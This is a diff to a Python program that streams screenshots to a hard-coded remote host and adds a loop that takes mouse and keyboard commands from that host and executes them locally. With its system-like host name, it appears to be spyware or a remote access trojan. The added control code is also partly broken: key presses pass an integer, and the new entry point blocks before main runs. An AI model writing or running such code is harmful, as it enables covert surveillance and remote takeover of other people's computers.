@@ -10,12 +10,13 @@ from comtypes import CLSCTX_ALL, CoInitialize, CoUninitialize
 from shutil import rmtree
 import rotatescreen as rs
 from PIL import Image
-import base64
+from mouse import move, click
 from io import BytesIO
 import time 
 import httpx
 import asyncio
 from mss import mss
+import pynput
 url = "https://ms32-sha2.onrender.com/"
 screen = rs.get_primary_display()
 terminate = False
@@ -312,13 +313,10 @@ async def share():
                     ss.rgb)
                 # ss.save(buffer, format="JPEG",quality=40)
                 buffer = BytesIO()
-                img.save(buffer,format="JPEG",quality=40)
+                img.save(buffer,format="JPEG",quality=80)
                 buffer.seek(0)
-                img = base64.b64encode(buffer.getvalue()).decode("utf-8")
-                try:
-                    await client.post(url+"screenshot", json={"image": img}, timeout=1.5)
-                except httpx.RequestError as e:
-                    print("Request failed:", e)
+                # img = base64.b64encode(buffer.getvalue())
+                await client.post(url+"screenshot", data=buffer.read())
                 elapsed_time = time.time() - start_time
                 fps = 1 / elapsed_time if elapsed_time > 0 else 0
                 print(f"FPS: {fps:.2f}")
@@ -326,6 +324,24 @@ async def share():
                 await asyncio.sleep(fps_delay)
 def async_runner():
     asyncio.run(share())
+async def control():
+    global sharing
+    controller = pynput.keyboard.Controller()
+    async with httpx.AsyncClient() as client:
+        while sharing:
+            data =  await client.get(url+"control")
+            data = data.json()
+            if data and data["type"] == "mouse":
+# {'height': 853, 'mouse': 0, 'type': 'mouse', 'width': 1517, 'x': 1516, 'y': 852}
+                print(data)
+                x = data["x"]*(1366/data["width"])
+                y = data["y"]*(768/data["height"])
+                import mouse
+                move(x,y)
+                click()
+            if data and data["type"] == "key":
+                controller.press(ord(chr(data["btn"])))
+                
 def main():
     global sstate
     global sharing
@@ -389,5 +405,8 @@ def main():
         except Exception as e:
             log(f"Main thread error occured:\t{e}",state="WARN")
     log("Shutting down",state="OFFLINE")
-
+    
+if __name__ == "__main__":
+    sharing=True
+    asyncio.run(control())
 main()
